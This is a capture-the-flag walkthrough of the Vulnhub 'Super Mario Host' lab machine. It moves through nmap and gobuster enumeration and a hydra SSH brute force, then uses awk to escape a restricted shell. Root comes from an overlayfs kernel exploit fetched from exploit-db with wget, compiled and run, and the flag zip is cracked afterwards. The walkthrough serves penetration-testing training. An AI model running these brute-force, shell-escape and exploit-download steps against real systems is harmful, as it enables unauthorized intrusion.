---
title: Vulnhub - Super Mario Host
description: My writeup on Super Mario Host box.
categories:
 - vulnhub
tags: vulnhub john ssh kernel bruteforce gobuster searchsploit rbash awk
---

![](https://static.posters.cz/image/750/%CE%91%CF%86%CE%AF%CF%83%CE%B5%CF%82/super-mario-characters-i22822.jpg)

Hi all, Let's pwn it!

You can find the machine there > [Super Mario Host](https://www.vulnhub.com/entry/super-mario-host-101,186/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.6
$ nmap -sC -sV -p- -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 00:44 EEST
Nmap scan report for mario.supermariohost.local (192.168.1.6)
Host is up (0.0010s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1c:97:c0:06:3b:cb:4f:6f:0f:65:8d:37:82:c4:23:59 (DSA)
|   2048 45:2d:fe:04:bb:98:ed:00:d7:7b:36:da:8f:cf:44:1c (RSA)
|   256 09:5c:25:9d:5c:54:ae:8d:90:e3:44:9b:5e:a1:4d:e0 (ECDSA)
|_  256 c9:d5:6a:32:53:ab:8a:43:74:4b:85:fb:a0:ba:40:52 (ED25519)
8180/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Mario
MAC Address: 00:0C:29:DF:8C:2E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When we visit the site, we get the default nginx page :

![](https://i.imgur.com/OW6e7me.png)

Let's run `gobuster` on it.

```
$ gobuster dir -q -u http://$ip:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster1.txt
/vhosts (Status: 200)
/server-status (Status: 403)
```

`/vhosts` has a virtual host file :

```
<VirtualHost *:80>

	ServerName mario.supermariohost.local
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/supermariohost
	DirectoryIndex mario.php

	ErrorLog ${APACHE_LOG_DIR}/supermariohost_error.log
	CustomLog ${APACHE_LOG_DIR}/supermariohost_access.log combined
 
</VirtualHost>
```

`ServerName mario.supermariohost.local` is the domain, let's add it at `/etc/hosts`

```
$ cat /etc/hosts
192.168.1.6     mario.supermariohost.local
```

Perfect, now if we browser the website with the domain name we can see a different page : 

![](https://i.imgur.com/GuqIVTU.png)

Let's run `gobuster` on it.

```
$ gobuster dir -q -u http://mario.supermariohost.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -o gobuster2.txt
/mario.php (Status: 200)
/command.php (Status: 200)
/luigi.php (Status: 200
```

I did some enumeration on them & the only things i found useful are the usernames `mario` & `luigi` we can do SSH brute force with them.

We should craft first a wordlist using `john`, i'll use the `Wordlist` rule on the 2 usernames.

## SSH brute force - Shell as luigi - Bypassing limited shell

```
$ touch usernames.txt
$ printf "mario\nluigi" > usernames.txt 
$ john -wordlist:usernames.txt -rules:Wordlist -stdout > wordlist.txt
$ hydra -L usernames.txt -P wordlist.txt $ip ssh

[DATA] attacking ssh://192.168.1.6:22/
[STATUS] 97.00 tries/min, 97 tries in 00:01h, 114 to do in 00:02h, 16 active
[22][ssh] host: 192.168.1.6   login: luigi   password: luigi1
```
`
Let's login in!

```
$ ssh luigi@$ip
luigi@192.168.1.6's password: 
You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
luigi:~$ 
```

We're in a limited shell :

```
luigi:~$ echo $SHELL
*** forbidden path: /usr/bin/lshell
``` 

Let's check what command we can run :

```
luigi:~$ ?
awk  cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  vim
```

We can exploit `awk` and open a normal `bash/sh` shell.

```
luigi:~$ awk 'BEGIN {system("/bin/bash")}'
luigi@supermariohost:~$ whoami
luigi
```

## Kernel privilege escalation

After lot of enumeration, i found nothing. I usually avoid to exploit old kernel versions, but on this box it's the only way to gain a root shell. So let's check kernel version :

```
luigi@supermariohost:~$ uname -a
Linux supermariohost 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
luigi@supermariohost:~$ uname -r
3.13.0-32-generic
```

Because it's an old box, we can see uses a really old kernel. Let's search for possible exploits with searchsploit.

```
$ searchsploit 3.13.0
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                              | linux/local/37292.c
```

This seems perfect, let's download it on target box & compile it.

```
luigi@supermariohost:/tmp$ wget -q https://www.exploit-db.com/download/37292 -O root.c
luigi@supermariohost:/tmp$ gcc root.c -o root
luigi@supermariohost:/tmp$ chmod +x root; ./root
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami;id
root
uid=0(root) gid=0(root) groups=0(root),112(lshell),1001(luigi)
```

## Cracking .zip & grab the flag

Now the challenge isnt over, we can see under `/root` directory a `.zip` :

```
# ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos  flag.zip
```

Probably we have to crack it & grab the flag, let's move it to `/var/www/html` so we can download it.

```
# mv flag.zip /var/www/html
```

In our box now :

```
$ wget -q $ip:8180/flag.zip
$ file flag.zip 
flag.zip: Zip archive data, at least v2.0 to extract
$ unzip flag.zip 
Archive:  flag.zip
```

We have to crack it, i'll use `fcrackzip` :

```
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip 


PASSWORD FOUND!!!!: pw == ilovepeach
$ unzip -P ilovepeach flag.zip 
Archive:  flag.zip
  inflating: flag.txt                
$ cat flag.txt 
Well done :D If you reached this it means you got root, congratulations.
Now, there are multiple ways to hack this machine. The goal is to get all the passwords of all the users in this machine. If you did it, then congratulations, I hope you had fun :D

Keep in touch on twitter through @mr_h4sh

Congratulations again!
								
mr_h4sh
```

awesome box! brings back lot of memories.

